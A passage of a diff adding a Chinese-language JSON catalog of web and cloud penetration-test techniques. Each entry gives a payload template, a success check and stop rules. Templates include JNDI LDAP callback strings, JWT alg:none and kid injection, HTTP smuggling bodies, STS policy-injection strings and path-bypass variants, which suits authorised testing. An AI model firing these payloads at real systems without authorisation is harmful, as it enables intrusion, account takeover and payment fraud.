+          "id": "report-upload-unauth",
+          "source": "report:upload-auth#b9770f36",
+          "label": "前端 JS 发现未授权上传口",
+          "template": "POST <UPLOAD_PATH>  multipart file=<TEST>.txt（不带 Token）",
+          "verify": "返回上传成功/文件路径",
+          "score": 5,
+          "reason": "给出从 JS 发现接口到无 Token 上传的完整路径"
+        }
+      ],
+      "stop": "只上传无害文本；不覆盖、不删除；不利用上传文件执行代码；验证后清理。"
+    },
+    {
+      "id": "upload-sts-wildcard",
+      "category": "upload/object-storage",
+      "title": "对象存储 STS 通配覆盖",
+      "assetTypes": [
+        "web",
+        "cloud"
+      ],
+      "scenarios": [
+        "web-cloud",
+        "web-upload"
+      ],
+      "signals": [
+        "sts",
+        "oss",
+        "s3",
+        "bucket",
+        "presigned",
+        "policy"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-sts-wildcard",
+      "variants": [
+        {
+          "id": "clown-sts-wildcard",
+          "source": "clown:file-upload-test.md#STS / 对象 key 通配覆盖",
+          "label": "key/prefix 通配 + x-upsert",
+          "template": "filename=* / prefix=* / key=**；PUT 时 x-upsert: true",
+          "verify": "能覆盖自己刚传的探测对象，证明同前缀可写",
+          "score": 5,
+          "reason": "覆盖 STS 策略拼接、通配、upsert 和验收方法"
+        }
+      ],
+      "stop": "只覆盖自己刚上传的探测对象；不覆盖官方/他人对象；不删除；不列桶；验证后清理。"
+    },
+    {
+      "id": "idor-id-swap",
+      "category": "access-control/idor",
+      "title": "水平越权 ID 替换",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram",
+        "app"
+      ],
+      "scenarios": [
+        "web-api-json",
+        "mobile-app"
+      ],
+      "signals": [
+        "idor",
+        "id",
+        "userid",
+        "objectid",
+        "越权",
+        "遍历"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-idor-pattern",
+      "variants": [
+        {
+          "id": "clown-idor",
+          "source": "clown:idor-test.md",
+          "label": "对象图 + 读差分",
+          "template": "主体 B + 对象 A（A 为测试者自建合成对象）；预期拒绝",
+          "verify": "记录允许/拒绝与脱敏字段",
+          "score": 4,
+          "reason": "方法论完整，强调最小伤害"
+        },
+        {
+          "id": "report-idor-pattern",
+          "source": "report:access-control-idor#71b3d2b0",
+          "label": "客户端加密 ID + 后端不校验归属",
+          "template": "<ID_FIELD>=<OTHER_TEST_OBJECT_ID>（仅用两个自有测试对象）",
+          "verify": "B 能读到 A 的合成对象，或字段归属与 JWT 不一致",
+          "score": 5,
+          "reason": "真实报告证明“前端加密 ID”不等于授权；补足对象图验证"
+        }
+      ],
+      "stop": "只用两个自有测试账号和合成对象；不遍历真实 ID、不读取真实 PII；发现即停。"
+    },
+    {
+      "id": "idor-uuid-leak",
+      "category": "access-control/idor",
+      "title": "UUID/对象标识泄露",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-api-json"
+      ],
+      "signals": [
+        "uuid",
+        "guid",
+        "js",
+        "response",
+        "objectid"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-uuid",
+      "variants": [
+        {
+          "id": "clown-uuid",
+          "source": "clown:idor-test.md#对象标识",
+          "label": "从 JS/回包收集对象 ID",
+          "template": "在 JS、列表回包、分享链接中收集 <UUID>，再用另一测试主体访问",
+          "verify": "B 访问 A 的合成对象成功",
+          "score": 4,
+          "reason": "适合不可枚举的 UUID 场景"
+        }
+      ],
+      "stop": "只收集测试账号可见的合成对象；不爬取他人页面；不批量。"
+    },
+    {
+      "id": "bfla-method-swap",
+      "category": "access-control/bfla",
+      "title": "功能级越权/方法替换",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json"
+      ],
+      "signals": [
+        "bfla",
+        "role",
+        "admin",
+        "method",
+        "endpoint"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-bfla",
+      "variants": [
+        {
+          "id": "clown-bfla",
+          "source": "clown:idor-test.md#BFLA",
+          "label": "低权账号访问高权端点",
+          "template": "低权 Token → GET <ADMIN_ENDPOINT>；对照高权/无 Token",
+          "verify": "低权返回管理数据或成功",
+          "score": 4,
+          "reason": "覆盖端点级权限校验缺失"
+        }
+      ],
+      "stop": "只做只读 GET；不调用管理写接口；不修改角色；发现即停。"
+    },
+    {
+      "id": "mass-assignment",
+      "category": "access-control/mass-assignment",
+      "title": "批量赋值/隐藏字段",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json"
+      ],
+      "signals": [
+        "mass assignment",
+        "role",
+        "isadmin",
+        "hidden",
+        "字段"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-mass-assignment",
+      "variants": [
+        {
+          "id": "clown-mass-assignment",
+          "source": "clown:idor-test.md#Mass Assignment",
+          "label": "添加隐藏可写字段",
+          "template": "{\"role\":\"<TEST_ROLE>\",\"isAdmin\":true}",
+          "verify": "自己账号权限/字段真变且能改回",
+          "score": 4,
+          "reason": "强调只改自己的测试账号并改回"
+        }
+      ],
+      "stop": "只改自己的测试账号；不改他人；能改回才继续；不提升到真实管理员。"
+    },
+    {
+      "id": "jwt-none",
+      "category": "auth/jwt",
+      "title": "JWT alg:none",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-login",
+        "web-api-json"
+      ],
+      "signals": [
+        "jwt",
+        "alg",
+        "none",
+        "token",
+        "bearer"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-jwt-none",
+      "variants": [
+        {
+          "id": "clown-jwt-none",
+          "source": "clown:oauth-jwt-test.md#alg:none",
+          "label": "去掉签名并改 alg",
+          "template": "{\"alg\":\"none\",\"typ\":\"JWT\"}.<PAYLOAD>.",
+          "verify": "服务端接受无签名 Token",
+          "score": 5,
+          "reason": "标准检测，覆盖大小写/空格变体"
+        }
+      ],
+      "stop": "只用自己的测试账号；不伪造他人身份；不调用写接口。"
+    },
+    {
+      "id": "jwt-weak-secret",
+      "category": "auth/jwt",
+      "title": "JWT 弱密钥",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-login"
+      ],
+      "signals": [
+        "jwt",
+        "hs256",
+        "secret",
+        "弱密钥"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-jwt-weak",
+      "variants": [
+        {
+          "id": "clown-jwt-weak",
+          "source": "clown:oauth-jwt-test.md#弱密钥",
+          "label": "字典验证 HS256",
+          "template": "使用小字典验证 <TOKEN> 的 HS256 密钥",
+          "verify": "命中后能签出同结构 Token",
+          "score": 4,
+          "reason": "只做小字典验证，不爆破"
+        }
+      ],
+      "stop": "只测自己的 Token；不做大规模爆破；不伪造他人身份。"
+    },
+    {
+      "id": "jwt-kid-injection",
+      "category": "auth/jwt",
+      "title": "JWT kid 注入",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-login"
+      ],
+      "signals": [
+        "jwt",
+        "kid",
+        "header",
+        "injection"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-jwt-kid",
+      "variants": [
+        {
+          "id": "clown-jwt-kid",
+          "source": "clown:oauth-jwt-test.md#kid 注入",
+          "label": "kid SQLi/路径穿越",
+          "template": "{\"kid\":\"<INJECTION_PLACEHOLDER>\"}",
+          "verify": "kid 被拼进 SQL/文件路径并产生差异",
+          "score": 5,
+          "reason": "覆盖 SQLi 和路径两类 kid 用法"
+        }
+      ],
+      "stop": "只验证差异；不读文件、不修改数据库；发现即停。"
+    },
+    {
+      "id": "oauth-userid-swap",
+      "category": "auth/oauth",
+      "title": "OAuth/扫码登录 userId 替换",
+      "assetTypes": [
+        "web",
+        "api",
+        "app",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-login",
+        "mobile-app"
+      ],
+      "signals": [
+        "oauth",
+        "qrcode",
+        "userid",
+        "login",
+        "扫码"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-oauth-userid-swap",
+      "variants": [
+        {
+          "id": "clown-oauth-flow",
+          "source": "clown:oauth-jwt-test.md#OAuth 流程",
+          "label": "授权码/状态校验",
+          "template": "检查 code/state 是否绑定会话",
+          "verify": "code 可重放或 state 不校验",
+          "score": 4,
+          "reason": "覆盖 OAuth 基础校验"
+        },
+        {
+          "id": "report-oauth-userid-swap",
+          "source": "report:auth-oauth#e08be668",
+          "label": "扫码确认接口替换 userId",
+          "template": "status=2/4 + userId=<OTHER_TEST_ACCOUNT_ID>（仅自有测试账号）",
+          "verify": "轮询返回目标测试账号授权码",
+          "score": 5,
+          "reason": "真实报告证明 userId 未绑定会话；补足扫码登录场景"
+        }
+      ],
+      "stop": "只用两个自有测试账号；不接管真实用户；发现即停；不保存授权码。"
+    },
+    {
+      "id": "oauth-code-reuse",
+      "category": "auth/oauth",
+      "title": "OAuth 授权码重放",
+      "assetTypes": [
+        "web",
+        "api",
+        "app"
+      ],
+      "scenarios": [
+        "web-login"
+      ],
+      "signals": [
+        "oauth",
+        "code",
+        "replay",
+        "state"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-oauth-code",
+      "variants": [
+        {
+          "id": "clown-oauth-code",
+          "source": "clown:oauth-jwt-test.md#授权码",
+          "label": "code 重放/未绑定 client",
+          "template": "同一 <CODE> 第二次兑换",
+          "verify": "第二次仍成功或跨 client 成功",
+          "score": 4,
+          "reason": "覆盖授权码一次性校验缺失"
+        }
+      ],
+      "stop": "只用自己的测试账号；不重放他人 code；不保存 Token。"
+    },
+    {
+      "id": "auth-token-issuance",
+      "category": "auth/token",
+      "title": "未授权 Token 签发",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-login",
+        "web-api-json"
+      ],
+      "signals": [
+        "token",
+        "get_token",
+        "employee",
+        "username",
+        "签发"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-token-issuance",
+      "variants": [
+        {
+          "id": "clown-auth-issue",
+          "source": "clown:authbypass-test.md#联合登录只吃 uin",
+          "label": "只带身份字段签发",
+          "template": "POST <TOKEN_ENDPOINT> {\"username\":\"<TEST_ACCOUNT>\"}",
+          "verify": "返回该测试账号的 Token",
+          "score": 4,
+          "reason": "覆盖多种签发口，但部分条目涉及接管"
+        },
+        {
+          "id": "report-token-issuance",
+          "source": "report:auth-token#6c436456",
+          "label": "工号换 JWT",
+          "template": "POST /<TOKEN_PATH> {\"username\":\"<TEST_EMPLOYEE_CODE>\"}",
+          "verify": "返回对应测试账号 JWT",
+          "score": 5,
+          "reason": "真实报告给出完整签发链；只用自有测试工号"
+        }
+      ],
+      "stop": "只用自己的测试账号/工号；不签发他人 Token；不调用业务写接口；发现即停。"
+    },
+    {
+      "id": "auth-empty-code",
+      "category": "auth/verification",
+      "title": "验证码/授权码空值绕过",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-login"
+      ],
+      "signals": [
+        "code",
+        "sms",
+        "captcha",
+        "empty",
+        "验证码"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-empty-code",
+      "variants": [
+        {
+          "id": "clown-empty-code",
+          "source": "clown:authbypass-test.md#未登录改密口",
+          "label": "验证码置空/省略",
+          "template": "{\"code\":\"\",\"newPassword\":\"<TEST_PASSWORD>\"}",
+          "verify": "置空验证码仍成功",
+          "score": 4,
+          "reason": "覆盖空值/省略/重复三类，但写操作需人工确认"
+        }
+      ],
+      "stop": "只用自己的测试账号；不修改他人密码；能改回才继续；不注销会话。"
+    },
+    {
+      "id": "logic-price-tamper",
+      "category": "logic/payment",
+      "title": "支付金额篡改",
+      "assetTypes": [
+        "web",
+        "api",
+        "app",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "logic-payment"
+      ],
+      "signals": [
+        "price",
+        "amount",
+        "payment",
+        "order",
+        "支付",
+        "金额"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-payment-tamper",
+      "variants": [
+        {
+          "id": "clown-logic-pay",
+          "source": "clown:logic-test.md#支付",
+          "label": "金额/数量/优惠券字段",
+          "template": "amount=<TEST_AMOUNT> / quantity=-1",
+          "verify": "订单金额与预期不一致",
+          "score": 4,
+          "reason": "覆盖常见支付字段，但需隔离测试订单"
+        },
+        {
+          "id": "report-payment-tamper",
+          "source": "report:logic-payment#21fc1175",
+          "label": "客户端金额/状态信任",
+          "template": "修改 <AMOUNT_FIELD> 后重新提交测试订单",
+          "verify": "服务端按客户端金额结算",
+          "score": 5,
+          "reason": "真实报告证明服务端信任客户端金额；只用测试商品"
+        }
+      ],
+      "stop": "只用测试商品/测试订单；不产生真实资金损失；发现即停；不重复提交。"
+    },
+    {
+      "id": "logic-coupon-reuse",
+      "category": "logic/coupon",
+      "title": "优惠券/权益重复领取",
+      "assetTypes": [
+        "web",
+        "api",
+        "app",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "logic-payment"
+      ],
+      "signals": [
+        "coupon",
+        "promo",
+        "reward",
+        "领取",
+        "重置"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-coupon-reuse",
+      "variants": [
+        {
+          "id": "clown-logic-coupon",
+          "source": "clown:logic-test.md#商家促销绑定",
+          "label": "促销/绑定字段",
+          "template": "重复提交 <COUPON_ID> / 修改绑定对象",
+          "verify": "同一权益可重复领取或绑定他人",
+          "score": 4,
+          "reason": "覆盖促销绑定，但缺少真实场景"
+        },
+        {
+          "id": "report-coupon-reuse",
+          "source": "report:logic-coupon#355fc4c4",
+          "label": "身份重置 + 重复领取",
+          "template": "重放领取请求并替换 <IDENTITY_FIELD>（仅自有测试账号）",
+          "verify": "同一测试账号重复获得权益",
+          "score": 5,
+          "reason": "真实报告给出完整重复领取链；只用测试账号"
+        }
+      ],
+      "stop": "只用测试账号/测试权益；不刷真实库存/资金；发现即停；不批量。"
+    },
+    {
+      "id": "race-condition",
+      "category": "logic/race",
+      "title": "并发/竞态条件",
+      "assetTypes": [
+        "web",
+        "api",
+        "app",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "race"
+      ],
+      "signals": [
+        "race",
+        "concurrent",
+        "parallel",
+        "并发",
+        "竞态"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-race",
+      "variants": [
+        {
+          "id": "clown-race",
+          "source": "clown:race-condition-test.md#并发测试",
+          "label": "并行请求同一资源",
+          "template": "并发 2-5 个相同请求（仅测试订单/测试券）",
+          "verify": "出现超卖/重复领取/状态不一致",
+          "score": 5,
+          "reason": "覆盖多种竞态场景和并发脚本"
+        }
+      ],
+      "stop": "只用测试数据；并发数 2-5；不压测、不打生产库存；发现即停。"
+    },
+    {
+      "id": "csrf-form",
+      "category": "csrf/form",
+      "title": "CSRF 表单验证",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-login"
+      ],
+      "signals": [
+        "csrf",
+        "form",
+        "cookie",
+        "samesite"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-csrf-form",
+      "variants": [
+        {
+          "id": "clown-csrf-form",
+          "source": "clown:csrf-test.md#表单 CSRF",
+          "label": "自动提交表单 PoC",
+          "template": "<form action=\"<TARGET>\" method=\"POST\"><input name=\"<FIELD>\" value=\"<TEST_VALUE>\"></form>",
+          "verify": "受害者会话下请求成功",
+          "score": 5,
+          "reason": "标准表单 PoC，强调 SameSite/Token 检查"
+        }
+      ],
+      "stop": "只在自己的测试账号/测试环境验证；不诱导真实用户；不执行写操作。"
+    },
+    {
+      "id": "http-smuggling-clte",
+      "category": "http/smuggling",
+      "title": "HTTP 请求走私 CL.TE",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-infra",
+        "infra-http"
+      ],
+      "signals": [
+        "smuggling",
+        "cl.te",
+        "content-length",
+        "transfer-encoding",
+        "gateway"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-clte",
+      "variants": [
+        {
+          "id": "clown-clte",
+          "source": "clown:http-smuggling-test.md#CL.TE",
+          "label": "CL.TE 双请求",
+          "template": "POST <PATH>  CL:6  TE:chunked  0\\r\\n\\r\\nG",
+          "verify": "第二个请求被错误解析/队列污染",
+          "score": 5,
+          "reason": "覆盖 CL.TE 原理和检测"
+        }
+      ],
+      "stop": "仅在隔离测试环境；不做队列污染/劫持真实用户；发现即停。"
+    },
+    {
+      "id": "http-smuggling-tecl",
+      "category": "http/smuggling",
+      "title": "HTTP 请求走私 TE.CL",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-infra",
+        "infra-http"
+      ],
+      "signals": [
+        "smuggling",
+        "te.cl",
+        "content-length",
+        "transfer-encoding"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-tecl",
+      "variants": [
+        {
+          "id": "clown-tecl",
+          "source": "clown:http-smuggling-test.md#TE.CL",
+          "label": "TE.CL 双请求",
+          "template": "POST <PATH>  TE:chunked  CL:<N>  <CHUNK>",
+          "verify": "后端按不同边界解析",
+          "score": 5,
+          "reason": "覆盖 TE.CL 原理和检测"
+        }
+      ],
+      "stop": "仅隔离环境；不污染生产队列；发现即停。"
+    },
+    {
+      "id": "cache-poisoning-host",
+      "category": "http/cache",
+      "title": "缓存投毒 Host 头",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-infra"
+      ],
+      "signals": [
+        "cache",
+        "cdn",
+        "x-forwarded-host",
+        "host",
+        "缓存"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-cache-host",
+      "variants": [
+        {
+          "id": "clown-cache-host",
+          "source": "clown:cache-poisoning-test.md#Host 头",
+          "label": "X-Forwarded-Host 污染缓存",
+          "template": "X-Forwarded-Host: <CALLBACK>",
+          "verify": "缓存命中后其他用户收到污染响应",
+          "score": 5,
+          "reason": "覆盖缓存键与 Host 头组合"
+        }
+      ],
+      "stop": "只用自己的回调域名；不污染生产缓存；验证后清理缓存；发现即停。"
+    },
+    {
+      "id": "host-header-injection",
+      "category": "http/host-header",
+      "title": "Host 头注入",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-infra",
+        "web-login"
+      ],
+      "signals": [
+        "host",
+        "x-forwarded-host",
+        "reset",
+        "password",
+        "链接"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-host-header",
+      "variants": [
+        {
+          "id": "clown-host-header",
+          "source": "clown:http-host-header-test.md#Host 注入",
+          "label": "Host/X-Forwarded-Host 影响链接",
+          "template": "Host: <CALLBACK>",
+          "verify": "邮件/重置链接指向回调域名",
+          "score": 4,
+          "reason": "覆盖密码重置链接污染"
+        }
+      ],
+      "stop": "只用自己的回调域名；不触发真实邮件/短信；不重置他人密码；发现即停。"
+    },
+    {
+      "id": "open-redirect",
+      "category": "redirect/open",
+      "title": "开放重定向",
+      "assetTypes": [
+        "web",
+        "miniprogram",
+        "app"
+      ],
+      "scenarios": [
+        "web-redirect"
+      ],
+      "signals": [
+        "redirect",
+        "returnurl",
+        "next",
+        "url",
+        "跳转"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-open-redirect",
+      "variants": [
+        {
+          "id": "clown-open-redirect",
+          "source": "clown:open-redirect-test.md#常见 Payload",
+          "label": "协议相对/绝对/编码",
+          "template": "//<CALLBACK> / https://<CALLBACK> / /<CALLBACK> / %2f%2f<CALLBACK>",
+          "verify": "跳转到自己的回调域名",
+          "score": 5,
+          "reason": "覆盖多种解析差异"
+        }
+      ],
+      "stop": "只跳转到自己的回调域名；不钓鱼、不收集凭据；发现即停。"
+    },
+    {
+      "id": "prototype-pollution",
+      "category": "injection/prototype-pollution",
+      "title": "原型链污染",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json"
+      ],
+      "signals": [
+        "prototype",
+        "__proto__",
+        "constructor",
+        "node",
+        "json"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-prototype",
+      "variants": [
+        {
+          "id": "clown-prototype",
+          "source": "clown:prototype-pollution-test.md#基础",
+          "label": "__proto__/constructor 污染",
+          "template": "{\"__proto__\":{\"polluted\":\"<MARKER>\"}}",
+          "verify": "后续响应/行为出现污染标记",
+          "score": 5,
+          "reason": "覆盖 JSON/query 两种入口和检测"
+        }
+      ],
+      "stop": "只污染测试进程的标记字段；不触发 RCE、不写文件、不影响其他用户。"
+    },
+    {
+      "id": "deserialization-java",
+      "category": "injection/deserialization",
+      "title": "Java 反序列化检测（确认即停）",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "deserialization"
+      ],
+      "signals": [
+        "deserialize",
+        "java",
+        "ysoserial",
+        "jndi",
+        "rmi"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-deser",
+      "variants": [
+        {
+          "id": "clown-deser",
+          "source": "clown:deserialization-test.md#Java",
+          "label": "ysoserial/JNDI 探测",
+          "template": "使用 <GADGET> 生成 DNS 回调 payload",
+          "verify": "回调出现 DNS 请求",
+          "score": 4,
+          "reason": "内容完整但属于高影响利用链，仅保留为人工审查参考"
+        }
+      ],
+      "stop": "只发送一次验证链，确认命令执行（如 id/whoami/echo）后立即停止；不拿 shell、不反弹、不写文件、不持久化。"
+    },
+    {
+      "id": "jndi-lookup",
+      "category": "injection/jndi",
+      "title": "JNDI 注入检测（仅参考）",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "deserialization"
+      ],
+      "signals": [
+        "jndi",
+        "ldap",
+        "rmi",
+        "log4j",
+        "lookup"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-jndi",
+      "variants": [
+        {
+          "id": "clown-jndi",
+          "source": "clown:jndi-injection-test.md#基础",
+          "label": "JNDI 回调",
+          "template": "${jndi:ldap://<CALLBACK>/a}",
+          "verify": "回调出现 LDAP/DNS 请求",
+          "score": 4,
+          "reason": "覆盖多种注入位置，但利用链高风险"
+        }
+      ],
+      "stop": "只做回调检测；不加载远程类、不执行命令；发现即停。"
+    },
+    {
+      "id": "graphql-introspection",
+      "category": "graphql",
+      "title": "GraphQL  introspection",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "graphql"
+      ],
+      "signals": [
+        "graphql",
+        "introspection",
+        "__schema"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-graphql-intro",
+      "variants": [
+        {
+          "id": "clown-graphql-intro",
+          "source": "clown:graphql-test.md#Introspection",
+          "label": "标准 introspection",
+          "template": "{__schema{types{name fields{name}}}}",
+          "verify": "返回 schema",
+          "score": 5,
+          "reason": "标准查询，适合发现隐藏字段"
+        }
+      ],
+      "stop": "只读 schema；不批量查询业务数据；发现即停。"
+    },
+    {
+      "id": "graphql-batch",
+      "category": "graphql",
+      "title": "GraphQL 批量/别名滥用",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "graphql"
+      ],
+      "signals": [
+        "graphql",
+        "batch",
+        "alias",
+        "rate limit"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-graphql-batch",
+      "variants": [
+        {
+          "id": "clown-graphql-batch",
+          "source": "clown:graphql-test.md#批量",
+          "label": "别名批量请求",
+          "template": "query { a:user(id:1){id} b:user(id:2){id} }",
+          "verify": "单请求返回多个对象/绕过限流",
+          "score": 4,
+          "reason": "覆盖别名批量与限流绕过"
+        }
+      ],
+      "stop": "只用测试对象；不批量枚举真实用户；发现即停。"
+    },
+    {
+      "id": "websocket-origin",
+      "category": "websocket",
+      "title": "WebSocket Origin 校验",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "websocket"
+      ],
+      "signals": [
+        "websocket",
+        "origin",
+        "ws",
+        "cswsh"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-websocket-origin",
+      "variants": [
+        {
+          "id": "clown-websocket-origin",
+          "source": "clown:websocket-test.md#Origin",
+          "label": "伪造 Origin 建连",
+          "template": "Origin: https://<CALLBACK>",
+          "verify": "握手成功并收到业务消息",
+          "score": 4,
+          "reason": "覆盖 CSWSH 基础检测"
+        }
+      ],
+      "stop": "只用自己的会话；不读取他人消息；不发送业务写消息；发现即停。"
+    },
+    {
+      "id": "api-gateway-path",
+      "category": "api-gateway/path",
+      "title": "API 网关路径规范化绕过",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-infra",
+        "web-api-json"
+      ],
+      "signals": [
+        "gateway",
+        "path",
+        "normalization",
+        "admin",
+        "403"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-gateway-path",
+      "variants": [
+        {
+          "id": "clown-gateway-path",
+          "source": "clown:api-gateway-test.md#路径规范化",
+          "label": "点号/双斜杠/编码/分号",
+          "template": "/api/./admin / /api//admin / /api/%2e/admin / /api/;/admin",
+          "verify": "网关放行且后端命中受保护路径",
+          "score": 5,
+          "reason": "覆盖多种规范化差异"
+        }
+      ],
+      "stop": "只访问只读端点；不调用删除/写入接口；发现即停。"
+    },
+    {
+      "id": "info-leak-actuator",
+      "category": "info-leak",
+      "title": "常见信息泄露端点",
+      "assetTypes": [
+        "web",
+        "api",
+        "cloud"
+      ],
+      "scenarios": [
+        "web-api-json",
+        "web-infra"
+      ],
+      "signals": [
+        "actuator",
+        "swagger",
+        "env",
+        "git",
+        "info leak"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-info-leak",
+      "variants": [
+        {
+          "id": "clown-info-leak",
+          "source": "clown:info-leak-test.md#常见端点",
+          "label": "Actuator/Swagger/.git",
+          "template": "/actuator/env /swagger-ui.html /.git/config",
+          "verify": "返回配置/接口/源码信息",
+          "score": 4,
+          "reason": "覆盖常见暴露面，适合低影响发现"
+        }
+      ],
+      "stop": "只读公开配置；不下载源码/数据库；发现密钥只记录类别并脱敏；不进一步利用。"
+    },
+    {
+      "id": "subdomain-takeover",
+      "category": "recon/subdomain",
+      "title": "子域接管",
+      "assetTypes": [
+        "web",
+        "cloud"
+      ],
+      "scenarios": [
+        "web-cloud",
+        "web-infra"
+      ],
+      "signals": [
+        "subdomain",
+        "cname",
+        "takeover",
+        "dangling"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-subdomain",
+      "variants": [
+        {
+          "id": "clown-subdomain",
+          "source": "clown:subdomain-takeover-test.md#指纹",
+          "label": "CNAME 指纹匹配",
+          "template": "dig <SUBDOMAIN> CNAME → 匹配未认领服务指纹",
+          "verify": "可认领但未认领",
+          "score": 4,
+          "reason": "覆盖常见服务指纹"
+        }
+      ],
+      "stop": "只验证 CNAME/指纹；不实际认领、不发布内容；发现即停。"
+    },
+    {
+      "id": "cloud-sts-policy",
+      "category": "cloud/sts",
+      "title": "云 STS Policy 注入",
+      "assetTypes": [
+        "cloud",
+        "web"
+      ],
+      "scenarios": [
+        "web-cloud",
+        "cloud-iam"
+      ],
+      "signals": [
+        "sts",
+        "policy",
+        "oss",
+        "bucket",
+        "wildcard",
+        "assumerole"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "article-alicloud-policy",
+      "variants": [
+        {
+          "id": "clown-sts-policy",
+          "source": "clown:file-upload-test.md#STS / 对象 key 通配覆盖",
+          "label": "Policy 字段通配/目录穿越",
+          "template": "filename=* / Action=* / key=../",
+          "verify": "签发范围扩到整桶或他人前缀",
+          "score": 4,
+          "reason": "覆盖 STS Policy 拼接和范围扩大，但没有给出具体 JSON 闭合结构"
+        },
+        {
+          "id": "article-alicloud-policy",
+          "source": "note:cloud-sts-policy-article",
+          "label": "阿里云 Policy JSON 闭合 + 重复键",
+          "template": "?fid=x%22%5D%2C%22Action%22%3A%5B%22*%22%5D%2C%22Resource%22%3A%5B%22*",
+          "verify": "拼接后的 Policy 出现重复 Action/Resource，STS 返回超出原范围的凭证",
+          "score": 5,
+          "reason": "给出原始 Go 模板、闭合字符、重复键覆盖和完整请求，最可复现"
+        },
+        {
+          "id": "article-tencent-policy",
+          "source": "note:cloud-sts-policy-article",
+          "label": "腾讯云 COS 追加 Statement",
+          "template": "uploads/<USER>/x.txt\"]},{\"effect\":\"allow\",\"action\":[\"*\"],\"resource\":[\"*",
+          "verify": "Policy 返回两条 Statement，Action/Resource 为通配",
+          "score": 5,
+          "reason": "覆盖腾讯云 COS 的 qcs 格式和追加 Statement 写法"
+        }
+      ],
+      "stop": "只读/只覆盖自己刚传的探测对象；不列桶、不删、不覆盖他人；发现即停。"
+    },
+    {
